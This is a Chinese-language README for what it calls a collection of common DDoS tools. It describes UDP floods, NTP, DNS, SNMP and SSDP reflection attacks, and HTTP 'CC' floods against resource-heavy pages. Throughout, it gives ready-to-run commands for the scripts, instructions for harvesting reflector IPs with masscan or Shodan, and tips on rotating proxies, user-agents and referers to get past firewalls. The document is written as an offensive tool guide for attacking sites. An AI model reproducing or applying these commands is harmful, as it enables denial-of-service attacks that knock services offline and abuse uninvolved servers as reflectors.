# 常用dddos工具集合
## 目录
* [本工具攻击方法简介](#本工具攻击方法简介)
* [本工具使用方法](#使用方法)

## 本工具攻击方法简介

##### 网络层UDP攻击(目录：/udp/)：

>原理：发送海量数据包，顷刻占满目标系统的全部带宽，正常请求被堵在门外，拒绝服务的目的达成。
```
    1.UDP直接攻击（/udp/local/udpflood.php ）
        优点：操作简单，直接在本机上即可发动攻击
        缺点：由于本机发送大量UDP请求可能会被服务器商警告，或者在路由上被丢弃，且大型站点的机房都有防御，UDP直接攻击流量峰值无法突破大型站点的防御。正常应用情况下，UDP 包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。

    2.UDP反射型攻击（/udp/proxy/Saddam.py）
        优点：可以用较小的流量达到较大的攻击流量，且流量来自世界各地的真实服务器，难以被拦截。
        缺点：操作复杂，需收集大量IP，且需要机房允许发送伪造的数据包（大部分正规机房不允许发送伪造的UDP数据包）
```

##### 应用层CC攻击(目录：/cc/):

> 原理：对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务器端资源的目的。在Web应用中，查询数据库、读写硬盘文件等操作，相对都会消耗比较多的资源。

    1.CC直接攻击（/cc/local.py）
      优点：操作便捷，使用本机运行程序攻击
      缺点：单IP请求太频繁容易被目标站防火墙拦截禁封IP

    2.CC代理攻击（/cc/proxy-txt.py）
      优点：使用大量代理IP攻击，不易被拦截
      缺点：需要购买大量代理IP

## 使用方法
    如果要攻击的站点使用的是独立IP，可以直接输入IP地址
    如果要攻击的站点为某个网址，建议修改/etc/hosts，绑定要攻击域名与IP，减少DNS查询次数

##### 网络层UDP攻击(/udp/)

1. UDP直接攻击(/udp/local/)
```sh
    #php版本 > 5.4
    1.访问网址调用
      http://127.0.0.1/udpflood-web.php?pass=1f3870be274f6c49b3e31a0c6728957f&host=www.test.com&port=80&time=99999&packet=9999&bytes=999
    2.运行PHP文件调用
      php ./udpflood.php  host=www.test.com port=80 time=99999 packet=9999 bytes=999
```
2. UDP反射攻击(/udp/proxy/)
```sh
    #python版本2.7
    1.收集IP地址
      使用工具（如：masscan或者shodan）查找出大量开启NTP服务123端口的服务器IP，保存到ntp.txt文件
    2.填写参数运行python程序
      python Saddam.py www.test.com benchmark -n ntp.txt 
```
    > 此处以ntp攻击为例，其他反射攻击收集不同端口IP地址并修改 -n ntp.txt 即可
- -d dns反射攻击
- -s snmp反射攻击
- -p ssdp放射攻击

##### 应用层CC攻击(/cc/)
> python版本3.6
1. CC直接攻击(cc/local.py)
```sh
#get请求攻击 
  python3 local.py -v http://www.test.com/search.php?searchword=
#post请求攻击 
  python3 local.py -v http://www.test.com/search.php -p searchword
```

2. CC代理攻击(cc/proxy/)
```sh
#随机调用files/proxy.txt代理请求攻击 
  python3 proxy-txt.py -v http://www.test.com/search.php?keyword=
#使用luminati代理接口(修改proxyUser和proxyPass为自己的账户)
  python3 proxy-lum.py -v http://www.test.com/search.php?keyword=
#使用abuyun代理接口(修改proxyUser和proxyPass为自己的账户)
  python3 proxy-lum.py -v http://www.test.com/search.php?keyword=
```

###### 参数说明
- v 必选 待攻击网址或ip地址，例：-v www.test.com
- p 可选 post请求参数，例：-p searchword

###### files目录文件说明
- proxy.txt 随机代理，一行一个
- user-agents.txt 随机请求头，一行一个，防止目标站防火墙特征识别
- referers.txt 来路域名，一行一个
- keywords.txt 搜索关键词，一行一个
